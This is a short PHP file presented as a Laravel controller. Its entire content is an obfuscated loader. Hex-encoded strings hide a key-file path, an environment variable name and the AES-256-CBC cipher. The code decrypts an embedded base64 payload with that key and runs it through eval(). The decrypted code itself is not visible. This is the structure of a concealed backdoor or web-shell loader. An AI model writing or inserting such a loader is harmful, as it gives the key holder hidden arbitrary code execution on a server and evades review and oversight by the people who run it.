<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+QX3YRvYBrALDWVpaew2ZQ==');

$c=base64_decode(

'NLkj68TB2sk2gN9pNAhz4ZzQVWVcc02v3PHGpINll+c+dfztzcVgxCQuB1TqwlOBUlgjGGPfhFaE' .
'/3yaJXK3erXMtRTyBuftPASHoD4SnHyuDJts697pPpslxaapdyibu5GaV6yYDjjarEpsOH4URvmM' .
'kZrDymy9+Khb6yRASACH6Lw8p0VHv9unqRbaNcsDrVo2Y6o0Jj1pNnplMyPB4z7G/7YNRjAmdMys' .
'JA+sbxQCiMU7mi96EKKBasa/OJRe'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

